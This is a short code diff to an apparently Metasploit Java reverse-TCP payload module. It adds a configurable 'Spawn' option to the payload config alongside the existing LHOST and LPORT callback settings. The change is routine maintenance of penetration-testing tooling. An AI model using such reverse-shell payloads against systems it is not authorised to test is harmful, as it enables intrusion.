@@ -34,12 +34,20 @@ module Metasploit3
 			'Handler'       => Msf::Handler::ReverseTcp,
 			'Stager'        => {'Payload' => ""}
 			))
+
+		register_advanced_options(
+			[
+				Msf::OptInt.new('Spawn', [ true, "Number of subprocesses to spawn", 2 ])
+			], self.class
+		)
+
 		@class_files = [ ]
 	end
 
 	def config
+		spawn = datastore["SPAWN"] || 2
 		c =  ""
-		c << "Spawn=2\n"
+		c << "Spawn=#{spawn}\n"
 		c << "LHOST=#{datastore["LHOST"]}\n" if datastore["LHOST"]
 		c << "LPORT=#{datastore["LPORT"]}\n" if datastore["LPORT"]
 		
